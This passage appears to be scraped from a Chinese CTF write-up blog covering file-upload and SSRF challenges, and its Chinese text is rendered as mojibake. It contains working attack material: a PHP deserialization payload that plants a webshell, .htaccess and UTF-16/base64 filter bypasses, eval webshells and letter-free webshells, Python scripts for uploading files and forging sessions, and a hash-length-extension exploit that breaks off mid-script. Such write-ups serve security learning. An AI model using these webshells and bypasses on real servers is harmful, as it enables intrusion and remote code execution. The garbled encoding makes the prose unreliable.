è¿™é‡Œè‚¯å®šæ˜¯åˆ©ç”¨__callå‡½æ•°å»æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤äº†ã€‚ æ„é€ POPé“¾å…ˆæ‰¾__destructæ–¹æ³•ï¼Œå¾ˆæ˜æ˜¾åˆšåˆšRegister.phpä¸­å°±æœ‰ææ„å‡½æ•°ã€‚ 123456public function __destruct() &#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125; &#125; è¿™é‡Œæˆ‘ä»¬ç”¨Register-&gt;checker = Profileï¼Œåˆ©ç”¨Profile-&gt;index()å»è§¦å‘Profileç±»ä¸­çš„__callé­”æœ¯æ–¹æ³•ã€‚ ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°Profile.phpå½“ä¸­çš„__callæ–¹æ³•è°ƒç”¨çš„å‚æ•°æ˜¯ 123456public function __call($name, $arguments)&#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125;&#125; é€šè¿‡æ–‡æ¡£æˆ‘ä»¬å¯ä»¥çŸ¥é“$nameæ˜¯ä¸å­˜åœ¨æ–¹æ³•çš„è°ƒç”¨çš„åå­—ï¼Œåœ¨è¿™é‡Œä¹Ÿå°±æ˜¯indexï¼Œ$argumentså°±æ˜¯ä¼ å…¥è°ƒç”¨æ–¹æ³•çš„å‚æ•°ï¼Œè¿™é‡Œå°±ä¸ºç©ºã€‚ è€Œå½“ä½¿ç”¨$this-&gt;indexçš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šè§¦å‘å¦ä¸€ä¸ªé­”æœ¯æ–¹æ³•__get 1234public function __get($name)&#123; return $this-&gt;except[$name];&#125; è¿™é‡Œåˆè°ƒç”¨äº†$this-&gt;except[$name]ï¼Œè€Œ$nameæˆ‘ä»¬å¯ä»¥é€šè¿‡__callè°ƒç”¨çš„å€¼ç¡®å®šä¸ºindexï¼Œè€Œä¸”Profileç±»å­˜åœ¨ä¸€ä¸ªå…¬æœ‰ç±»exceptå¯ä»¥ä¾›æˆ‘ä»¬ä¿®æ”¹ã€‚ æ¥ç€åˆ©ç”¨_getçš„è¿”å›ä¼šä½¿__callæ–¹æ³•ä¸­çš„ifä¸ºçœŸï¼Œæ‰§è¡Œ$this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);ã€‚ æœ‰äº†POPé“¾ä¹‹åï¼Œæˆ‘ä»¬åº”è¯¥å»è°ƒç”¨ä»€ä¹ˆå‡½æ•°å‘¢ï¼Œæ¥ç€çœ‹Profile.php 123456789101112131415161718192021222324252627public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/index&quot;; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; if(!empty($_FILES))&#123; $this-&gt;filename_tmp=$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $this-&gt;filename=md5($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]).&quot;.png&quot;; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;; $this-&gt;update_img(); &#125;else&#123; $this-&gt;error(&#x27;Forbidden type!&#x27;, url(&#x27;../index&#x27;)); &#125; &#125;else&#123; $this-&gt;error(&#x27;Unknow file type!&#x27;, url(&#x27;../index&#x27;)); &#125; &#125; ç¬¬ä¸€ä¸ªifå¯ä»¥ç›´æ¥passï¼Œç¬¬äºŒä¸ªifè¯­å¥å¦‚æœæˆ‘ä»¬ä¸ä¸Šä¼ æ–‡ä»¶ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡ï¼Œç¬¬ä¸‰ä¸ªifç›´æ¥èµ‹å€¼ç»•è¿‡ï¼Œç„¶åå¯ä»¥æ„é€ å›¾ç‰‡é©¬ç»•è¿‡getimagesizeçš„åˆ¤æ–­ï¼Œæ§åˆ¶$this-&gt;filenameä¸ºphpåç¼€å½¢å¼ï¼Œè¿™æ ·åˆ©ç”¨copy($this-&gt;filename_tmp, $this-&gt;filename)å°±å¯ä»¥å¤åˆ¶å‡ºäº†ä¸€ä¸ª php webshell äº†ã€‚ æ„é€ payloadçš„expï¼š 123456789101112131415161718192021222324&lt;?phpnamespace app\\web\\controller;use think\\Controller;class Register&#123; public $checker; public $registed = false; public function __construct($checker) &#123; $this-&gt;checker = $checker; &#125;&#125;class Profile&#123; public $filename_tmp = &#x27;./upload/adeee0c170ad4ffb110df0cde294aecd/00bf23e130fa1e525e332ff03dae345d.png&#x27;; public $filename = &#x27;./upload/adeee0c170ad4ffb110df0cde294aecd/shell.php&#x27;; public $ext = true; public $except = array(&#x27;index&#x27;=&gt;&#x27;upload_img&#x27;);&#125;$register = new Register(new Profile());echo urlencode(base64_encode(serialize($register))); å¾—åˆ°payload 1TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo0OntzOjEyOiJmaWxlbmFtZV90bXAiO3M6Nzg6Ii4vdXBsb2FkL2FkZWVlMGMxNzBhZDRmZmIxMTBkZjBjZGUyOTRhZWNkLzAwYmYyM2UxMzBmYTFlNTI1ZTMzMmZmMDNkYWUzNDVkLnBuZyI7czo4OiJmaWxlbmFtZSI7czo1MToiLi91cGxvYWQvYWRlZWUwYzE3MGFkNGZmYjExMGRmMGNkZTI5NGFlY2Qvc2hlbGwucGhwIjtzOjM6ImV4dCI7YjoxO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MTA6InVwbG9hZF9pbWciO319czo4OiJyZWdpc3RlZCI7YjowO30&#x3D; å¡«åˆ°cookieä¸­ï¼Œåˆ·æ–°é¡µé¢ èšå‰‘è¿æ¥æ‹¿flagã€‚ SUCTF2019 EasyWeb è€ƒç‚¹ æ— å­—æ¯æ•°å­—webshell æ–‡ä»¶ä¸Šä¼  .htaccessåˆ©ç”¨ è§£é¢˜ 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpfunction get_the_flag()&#123; // webadmin will remove your upload file every 20 min!!!! $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]); if(!file_exists($userdir))&#123; mkdir($userdir); &#125; if(!empty($_FILES[&quot;file&quot;]))&#123; $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $name = $_FILES[&quot;file&quot;][&quot;name&quot;]; $extension = substr($name, strrpos($name,&quot;.&quot;)+1); if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); if(mb_strpos(file_get_contents($tmp_name), &#x27;&lt;?&#x27;)!==False) die(&quot;^_^&quot;); if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); $path= $userdir.&quot;/&quot;.$name; @move_uploaded_file($tmp_name, $path); print_r($path); &#125;&#125;$hhh = @$_GET[&#x27;_&#x27;];if (!$hhh)&#123; highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123; die(&#x27;One inch long, one inch strong!&#x27;);&#125;if ( preg_match(&#x27;/[\\x00- 0-9A-Za-z\\&#x27;&quot;\\`~_&amp;.,|=[\\x7F]+/i&#x27;, $hhh) ) die(&#x27;Try something else!&#x27;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt; å’Œæå®¢å¤§æŒ‘æˆ˜2019 RCE MEç±»ä¼¼çš„payloadï¼š 1?_&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86&#x3D;phpinfo å¯ä»¥æˆåŠŸæ˜¾ç¤ºPHPINFOçš„ä¿¡æ¯ï¼Œæ³¨æ„å››ä¸ªç‚¹ï¼Œä¸€æ˜¯PHPç‰ˆæœ¬æ˜¯7.2ï¼ŒäºŒæ˜¯é¢˜ç›®çš„ç¯å¢ƒæ˜¯Apacheï¼Œä¸‰æ˜¯é™åˆ¶äº†open_basedirï¼Œæœ€åæ˜¯disable_functionã€‚ å†æ¥çœ‹get_the_flagå‡½æ•°ï¼ŒæŒ‰ç…§é¢˜æ„åº”è¯¥æ˜¯æƒ³è®©æˆ‘ä»¬é€šè¿‡è°ƒç”¨get_the_flagå‡½æ•°æ¥get shellï¼Œå‡½æ•°ä¸­æœ‰ä¸‰ä¸ªé™åˆ¶ï¼š æ–‡ä»¶å†…å®¹ä¸­ä¸èƒ½å‡ºç°&lt;? ä½¿ç”¨äº†exif_imagetypeæ¥åˆ¤æ–­æ˜¯ä¸æ˜¯å›¾ç‰‡ åç¼€åä¸­ä¸å…è®¸å‡ºç°ph è¿™é‡Œçš„é™åˆ¶æ¡ä»¶å°±æœ‰ç‚¹åƒSUCTF2019 CheckInï¼Œä¸åŒçš„æ˜¯é‚£é“é¢˜çš„ç¯å¢ƒæ˜¯nginxï¼Œå¯ä»¥é€šè¿‡ä¸Šä¼ .user.iniæ¥ç»•è¿‡ã€‚é‚£ä¹ˆè¿™é“é¢˜å¦‚æœè¦é€šè¿‡ä¸Šä¼ .htaccessæ¥ç»•è¿‡åç¼€åçš„é™åˆ¶ï¼Œå°±éœ€è¦ç»•è¿‡exif_imagetypeï¼Œå¹¶ä¸”ä¸èƒ½ç”¨GIF89aç­‰æ–‡ä»¶å¤´ï¼Œå› ä¸ºè¿™æ ·è™½ç„¶èƒ½ä¸Šä¼ æˆåŠŸï¼Œä½†.htaccessæ–‡ä»¶æ— æ³•ç”Ÿæ•ˆã€‚è¿™æ—¶æœ‰ä¸¤ä¸ªåŠæ³•ï¼š åœ¨.htaccesså‰æ·»åŠ  12#define width 1337#define height 1337 #åœ¨.htaccessæ˜¯æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥.htaccessæ–‡ä»¶å¯ä»¥ç”Ÿæ•ˆ åœ¨.htaccesså‰æ·»åŠ x00x00x8ax39x8ax39(è¦åœ¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ä¸­æ·»åŠ ï¼Œæˆ–è€…ä½¿ç”¨pythonçš„bytesç±»å‹) x00x00x8ax39x8ax39 æ˜¯wbmpæ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼Œ.htaccessä¸­ä»¥0x00å¼€å¤´çš„åŒæ ·ä¹Ÿæ˜¯æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥ä¸ä¼šå½±å“.htaccess æœ€åå°±éœ€è¦ç»•è¿‡&lt;?ï¼ŒåŒæ ·ä¹Ÿæœ‰ä¸¤ä¸ªåŠæ³•ï¼Œä¸è¿‡åªæ˜¯ç¼–ç çš„ä¸åŒè€Œå·²ï¼Œä¸€ç§æ˜¯base64ç¼–ç ï¼Œä¸€ç§æ˜¯uft-16ç¼–ç ï¼Œéƒ½æ¥äº†è§£ä¸€ä¸‹ã€‚ å…ˆæ¥çœ‹utf-16çš„ç¼–ç æ–¹å¼ï¼Œè¿™æ˜¯.htaccessæ–‡ä»¶ï¼š 12345678#define width 1337 # Define the width#define height 1337 # Define the heightAddType application&#x2F;x-httpd-php .cc # Say all file with extension .php16 will execute phpphp_value zend.multibyte 1 # Active specific encoding (you will see why after :D)php_value zend.detect_unicode 1 # Detect if the file have unicode contentphp_value display_errors 1 # Display php errors å¯ä»¥ç»•è¿‡çš„åŸå› å€Ÿç”¨ä¸€ä¸‹tr1pleå¸ˆå‚…çš„å›¾ ä¹Ÿå°±æ˜¯è¯´åŸæ¥æ˜¯utf-8ä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—èŠ‚ï¼Œç°åœ¨utf-16æ˜¯ä¸¤ä¸ªå­—èŠ‚ç¼–ç ä¸€ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆæ˜æ˜¾å¯ä»¥ç»•è¿‡å†…å®¹çš„è¿‡æ»¤ï¼Œexpï¼š 12345678910111213141516171819202122232425262728#!/usr/bin/python3# Description : create and bypass file upload filter with .htaccess# Author : Thibaud Robin# Will prove the file is a legit xbitmap file and the size is 1337x1337SIZE_HEADER = b&quot;\\n\\n#define width 1337\\n#define height 1337\\n\\n&quot;def generate_php_file(filename, script): phpfile = open(filename, &#x27;wb&#x27;) phpfile.write(script.encode(&#x27;utf-16be&#x27;)) phpfile.write(SIZE_HEADER) phpfile.close()def generate_htacess(): htaccess = open(&#x27;.htaccess&#x27;, &#x27;wb&#x27;) htaccess.write(SIZE_HEADER) htaccess.write(b&#x27;AddType application/x-httpd-php .cc\\n&#x27;) htaccess.write(b&#x27;php_value zend.multibyte 1\\n&#x27;) htaccess.write(b&#x27;php_value zend.detect_unicode 1\\n&#x27;) htaccess.write(b&#x27;php_value display_errors 1\\n&#x27;) htaccess.close() generate_htacess()generate_php_file(&quot;shell.cc&quot;, &quot;&lt;?php eval($_POST[&#x27;shell&#x27;]); ?&gt;&quot;) ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶ 1234567891011121314151617import requestsurl = &quot;http://8bf8acd4-49c6-40c6-9bfe-688945f733ac.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;payload = &#123;&#125;headers = &#123;&#125;htaccess_files = [ (&#x27;file&#x27;, open(&#x27;.htaccess&#x27;, &#x27;rb&#x27;))]shell_files = [ (&#x27;file&#x27;, open(&#x27;shell.cc&#x27;, &#x27;rb&#x27;))]response = requests.request(&quot;POST&quot;, url, headers=headers, data=payload, files=htaccess_files)print(response.text)response = requests.request(&quot;POST&quot;, url, headers=headers, data=payload, files=shell_files)print(response.text) éªŒè¯ä¸€ä¸‹ ç”¨èšå‰‘è¿æ¥ï¼ŒåŠ è½½ç»•è¿‡disable_functionçš„æ’ä»¶ ç¬¬äºŒç§æ˜¯ç”¨base64ç¼–ç ç»•è¿‡ htaccessæ–‡ä»¶å†…å®¹ 1234#define width 1#define height 1AddType application&#x2F;x-httpd-php .ccphp_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.cc&quot; shellçš„å†…å®¹ 12GIF89a12 &#x2F;&#x2F; 12ä¸ºäº†æ»¡è¶³base64ç®—æ³•å‡‘è¶³å…«ä¸ªå­—èŠ‚PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pPz4&#x3D; &#x2F;&#x2F;&lt;?php @eval($_POST[cmd])?&gt;çš„base64ç¼–ç  æ‹“å±• .htaccess trickæ€»ç»“ PHP7ç»•è¿‡open_basedir BSidesCF2019 SVGMagic è€ƒç‚¹ SVGæ–‡ä»¶æ ¼å¼ XXEè¯»å–æ–‡ä»¶ è§£é¢˜ å…ˆæ¥çœ‹çœ‹ä»€ä¹ˆæ˜¯SVGã€‚ SVG æ„ä¸ºå¯ç¼©æ”¾çŸ¢é‡å›¾å½¢ï¼ˆScalable Vector Graphicsï¼‰ï¼Œ ä½¿ç”¨ XML æ ¼å¼å®šä¹‰å›¾åƒã€‚ çœ‹ä¸€ä¸ªå®ä¾‹ ç”¨å¸¸è§„çš„XXEæ–‡ä»¶è¯»å–payload è¿™ä¸ªåœ°æ–¹æœ‰ä¸ªå‘å°±æ˜¯flagçš„æ–‡ä»¶ä½ç½®åœ¨å½“å‰ç›®å½•ï¼Œè€Œproc/self/cwdå°±ä»£è¡¨å½“å‰è·¯å¾„ã€‚ HFCTF2020 BabyUpload è€ƒç‚¹ ä»£ç å®¡è®¡ sessionä¼ªé€  è§£é¢˜ å®¡è®¡æºç å¯ä»¥å‘ç°è¿™å‡ ä¸ªç‚¹ sessionä¸­å­˜å‚¨äº†èº«ä»½ä¿¡æ¯ï¼Œé»˜è®¤äº‹guest é€šè¿‡å‚æ•°å¯ä»¥ä¸Šä¼ æ–‡ä»¶å’Œä¸‹è½½æ–‡ä»¶ æ—¢ç„¶è¿™æ ·ï¼Œé‚£æˆ‘ä»¬å°±å…ˆæŠŠsessionæ–‡ä»¶ä¸‹è½½ä¸‹æ¥çœ‹çœ‹æ˜¯ä»€ä¹ˆæ ·å­çš„ã€‚ åº”è¯¥æ˜¯ç”¨php_binaryæ–¹å¼åºåˆ—åŒ–çš„sessionã€‚ é‚£ä¹ˆç°åœ¨çš„æ€è·¯å°±æ˜¯ï¼š ä¼ªé€ admin session --&gt; ä¸Šä¼ æ–°çš„sessæ–‡ä»¶ --&gt; å°†cookieæ”¹æˆsessæ–‡ä»¶sha256åŠ å¯†åçš„å­—ç¬¦ä¸² ä½†æ˜¯ç°åœ¨è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯å¦‚æœç»•è¿‡å¯¹success.txtçš„åˆ¤æ–­ã€‚ ç”±äºæ–‡ä»¶åä¸å¯æ§ï¼Œæˆ‘ä»¬å°±æ— æ³•ä¸Šä¼ ä¸€ä¸ªåä¸ºsuccess.txtçš„æ–‡ä»¶ï¼Œä½†æ˜¯file_existså‡½æ•°çš„ä½œç”¨çš„æ˜¯æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨attråˆ›å»ºä¸€ä¸ªåä¸ºsuccess.txtçš„ç›®å½•å°±å¯ä»¥è¿‡è¿™ä¸ªåˆ¤æ–­ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839import requestsfrom io import BytesIOimport hashliburl = &#x27;&#x27;&#x27;http://0abaf9de-86a1-4b6e-ab78-f008f607f2d5.node3.buuoj.cn&#x27;&#x27;&#x27;def admin(): files = &#123; &quot;up_file&quot;: (&quot;sess&quot;, BytesIO(b&#x27;\\x08usernames:5:&quot;admin&quot;;&#x27;)) &#125; data = &#123; &quot;direction&quot;: &quot;download&quot;, &quot;attr&quot;: &quot;.&quot;, &#125; res = requests.post(url=url, data=data, files=files) session_id = hashlib.sha256(&#x27;\\x08usernames:5:&quot;admin&quot;;&#x27;.encode()).hexdigest() return session_iddef upload_success(): data = &#123; &quot;direction&quot;: &quot;upload&quot;, &quot;attr&quot;: &quot;success.txt&quot;, &#125; files = &#123; &quot;up_file&quot;: (&quot;test&quot;, BytesIO(b&#x27;good job!&#x27;)) &#125; r = requests.post(url=url, data=data, files=files)upload_success()php_session_id = admin()cookies = &#123; &#x27;PHPSESSID&#x27;: php_session_id&#125;s = requests.get(url)r = requests.get(url=url, cookies=cookies)print(r.text) HarekazeCTF2019 Avatar Uploader 1 è€ƒç‚¹ finfo_fileå‡½æ•°å’Œgetimagesizeå‡½æ•°çš„åŒºåˆ« è§£é¢˜ åŸé¢˜æ˜¯ç»™äº†æºç ã€‚ å…³é”®ä»£ç æ˜¯åœ¨upload.phpä¸­ 1234567891011121314151617// check file type$finfo = finfo_open(FILEINFO_MIME_TYPE);$type = finfo_file($finfo, $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);finfo_close($finfo);if (!in_array($type, [&#x27;image/png&#x27;])) &#123; error(&#x27;Uploaded file is not PNG format.&#x27;);&#125;// check file width/height$size = getimagesize($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);if ($size[0] &gt; 256 || $size[1] &gt; 256) &#123; error(&#x27;Uploaded image is too large.&#x27;);&#125;if ($size[2] !== IMAGETYPE_PNG) &#123; // I hope this never happens... error(&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27; . getenv(&#x27;FLAG1&#x27;) . &#x27;&lt;/code&gt;&#x27;);&#125; é¦–å…ˆæˆ‘ä»¬å¾—äº†è§£PHPæ–‡ä»¶å¤´æ ¼å¼æ˜¯ä»€ä¹ˆæ ·çš„ https://blog.csdn.net/u013943420/article/details/76855416 89 50 4E 47 0D 0A 1A 0A æ˜¯PNGå¤´éƒ¨ç½²ååŸŸï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªPNGå›¾ç‰‡ 00 00 00 0D æè¿°IHDRå¤´éƒ¨çš„å¤§å° 49 48 44 52 æ˜¯Chunk Type Code, è¿™é‡ŒChunk Type Code=IHDR æ¥ä¸‹æ¥éœ€è¦äº†è§£finfo_fileå‡½æ•°å’Œgetimagesizeå‡½æ•°çš„åŒºåˆ«å°±åœ¨äºï¼šFILEINFO å¯ä»¥è¯†åˆ« png å›¾ç‰‡( åå…­è¿›åˆ¶ä¸‹ )çš„ç¬¬ä¸€è¡Œï¼Œè€Œ getimagesize ä¸å¯ä»¥ã€‚ SUCTF 2019 getshell è€ƒç‚¹ æ— æ•°å­—å­—æ¯webshell è§£é¢˜ å¯ç”¨å­—ç¬¦ï¼š$().;=[]_~ å–åç»•è¿‡ï¼Œwebshellï¼š 123456789101112131415161718192021222324&lt;?php$_=~(ç);$__.=$_[[]==[]];$_=~(æŒŸ);$__.=$_[[]==[]];$_=~(æŒŸ);$__.=$_[[]==[]];$_=~(éš™);$__.=$_[[]==[]];$_=~(å¸);$__.=$_[[]==[]];$_=~(å‹‹);$__.=$_[[]==[]];$_=~(æ ¡);$___.=$_[[]==[]];$_=~(ä¸‹);$___.=$_[[]==[]];$_=~(çº¤);$___.=$_[[]==[]];$_=~(å«Œ);$___.=$_[[]==[]];$___=$$___;$__($___[_]); flagåœ¨envç¯å¢ƒå˜é‡ä¸­ã€‚ SUCTF 2019 Upload Labs 2 è€ƒç‚¹ è§£é¢˜ admin.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?phpinclude &#x27;config.php&#x27;;class Ad&#123; public $cmd; public $clazz; public $func1; public $func2; public $func3; public $instance; public $arg1; public $arg2; public $arg3; function __construct($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)&#123; $this-&gt;cmd = $cmd; $this-&gt;clazz = $clazz; $this-&gt;func1 = $func1; $this-&gt;func2 = $func2; $this-&gt;func3 = $func3; $this-&gt;arg1 = $arg1; $this-&gt;arg2 = $arg2; $this-&gt;arg3 = $arg3; &#125; function check()&#123; $reflect = new ReflectionClass($this-&gt;clazz); $this-&gt;instance = $reflect-&gt;newInstanceArgs(); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func1); $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg1); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func2); $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg2); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func3); $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg3); &#125; function __destruct()&#123; system($this-&gt;cmd); &#125;&#125;if($_SERVER[&#x27;REMOTE_ADDR&#x27;] == &#x27;127.0.0.1&#x27;)&#123; if(isset($_POST[&#x27;admin&#x27;]))&#123; $cmd = $_POST[&#x27;cmd&#x27;]; $clazz = $_POST[&#x27;clazz&#x27;]; $func1 = $_POST[&#x27;func1&#x27;]; $func2 = $_POST[&#x27;func2&#x27;]; $func3 = $_POST[&#x27;func3&#x27;]; $arg1 = $_POST[&#x27;arg1&#x27;]; $arg2 = $_POST[&#x27;arg2&#x27;]; $arg2 = $_POST[&#x27;arg3&#x27;]; $admin = new Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3); $admin-&gt;check(); &#125;&#125;else &#123; echo &quot;You r not admin!&quot;;&#125; TODO HarekazeCTF2019 Avatar Uploader 2 TODO D3CTF 2019 EzUpload TODO","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"CTF/æ–‡ä»¶ä¸Šä¼ ","permalink":"http://ca0y1h.top/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"buuctfåˆ·é¢˜â€”â€”SSRF","date":"2020-08-18T09:58:58.000Z","path":"Web_security/ctf_writeup/9.buuctfåˆ·é¢˜â€”â€”SSRF/","text":"De1CTF2019 SSRF Me è€ƒç‚¹ Pythonä»£ç å®¡è®¡ MD5æ‰©å±•æ”»å‡» è§£é¢˜ é¦–å…ˆçœ‹ä¸‰ä¸ªè·¯ç”±ï¼š 1234567891011121314151617181920212223# generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param)@app.route(&#x27;/De1ta&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if waf(param): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route(&#x27;/&#x27;)def index(): return open(&quot;code.txt&quot;, &quot;r&quot;).read() /ï¼šé¦–é¡µï¼Œè·å–æºç ï¼› /geneSignï¼šä»ç”¨æˆ·è·å–paramå‚æ•°ï¼Œå†ç»“åˆé¢„è®¾çš„action='scan'è°ƒç”¨getSignç”Ÿæˆç­¾åï¼› /De1taï¼šä»cookieä¸­è·å–actionå’Œsignï¼Œå†è·å–paramå‚æ•°ï¼Œç»“åˆå½“å‰IPåœ°å€æ„é€ ä¸€ä¸ªTaskç±»ï¼Œæœ€åä»¥jsonçš„æ ¼å¼è¿”å›Execæ–¹æ³•æ‰§è¡Œç»“æœã€‚ å†æ¥çœ‹getSignå‡½æ•°ï¼š 12def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() å°† secert_key å’Œ param å’Œ action æ‹¼åœ¨ä¸€èµ·ï¼Œå¯¹å…¶md5ç­¾åã€‚secert_keyæ˜¯éšæœºç”Ÿæˆçš„16ä¸ªå­—èŠ‚çš„å­—ç¬¦ä¸²ã€‚ ç„¶åæ¥çœ‹wafå‡½æ•°ï¼š 123456def waf(param): check = param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False ç¦æ­¢paramå‚æ•°ä»¥gopherå’Œfileå¼€å¤´ã€‚ å†æ¥çœ‹åˆ° Task ç±»çš„ Exec æ–¹æ³•ï¼š 123456789101112131415161718192021222324def Exec(self): result = &#123;&#125; result[&#x27;code&#x27;] = 500 if self.checkSign(): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;) resp = scan(self.param) if resp == &quot;Connection Timeout&quot;: result[&#x27;data&#x27;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[&#x27;code&#x27;] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;) result[&#x27;code&#x27;] = 200 result[&#x27;data&#x27;] = f.read() if result[&#x27;code&#x27;] == 500: result[&#x27;data&#x27;] = &quot;Action Error&quot; else: result[&#x27;code&#x27;] = 500 result[&#x27;msg&#x27;] = &quot;Sign Error&quot; return result é¦–å…ˆéªŒè¯ç­¾åï¼Œå¦‚æœæ˜¯scanç±»å‹å°±è°ƒç”¨ scan æ–¹æ³•æ¥è¯»å–å†…å®¹å¹¶å†™åˆ°æ²™ç›’ä¸‹çš„ result.txt æ–‡ä»¶ã€‚å¦‚æœæ˜¯readç±»å‹å°±è¯»å–æ²™ç›’ä¸­çš„result.txtå†…å®¹ã€‚ é‚£æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯ï¼š è¯»å– flag.txt åˆ° result.txtã€‚ å±•ç¤º result.txt çš„å†…å®¹ã€‚ æ–¹æ³•ä¸€ é¢„æœŸè§£æ³•ï¼šå“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»+CVE-2019-9948(urllib) ç®€å•æ¥è¯´MD5æ‰©å±•é•¿åº¦æ”»å‡»çš„åŸç†ï¼š https://www.jianshu.com/p/241e772a513f å½“å·²çŸ¥ä»¥ä¸‹ä¸‰ç‚¹ md5(salt+message)çš„å€¼ messageå†…å®¹ salt+messageé•¿åº¦ æˆ‘ä»¬å¯ä»¥åœ¨ä¸çŸ¥é“saltçš„å…·ä½“å†…å®¹çš„æƒ…å†µä¸‹ï¼Œè®¡ç®—å‡ºä»»æ„çš„md5(salt+message+padding+append)å€¼ urlopenæœ‰ä¸¤ç§åŠæ³•å¯ä»¥è¯»å–åˆ°æœ¬åœ°æ–‡ä»¶ã€‚ ç›´æ¥å†™æ–‡ä»¶åï¼Œå‰é¢å•¥éƒ½åˆ«å¸¦ã€‚ local_file: ,å‚è€ƒ https://bugs.python.org/issue35907 Pythonè„šæœ¬expï¼š 1234567891011121314151617import hashpumpyimport requestsimport urllib.parseurl = &#x27;http://34b95521-f528-44e1-bcf5-b55918e71fc1.node3.buuoj.cn/&#x27;param = &#x27;flag.txt&#x27;r = requests.get(url + &#x27;getSign&#x27;, params=&#123;&#x27;param&#x27;: param&#125;)sign = r.text# generate signhash_sign = hashpumpy.hashpump(sign, param + &#x27;scan&#x27;, &#x27;read&#x27;, 16)r = requests.get(url + &#x27;De1ta&#x27;, params=&#123;&#x27;param&#x27;: param&#125;, cookies=&#123; &#x27;sign&#x27;: hash_sign[0], &#x27;action&#x27;: 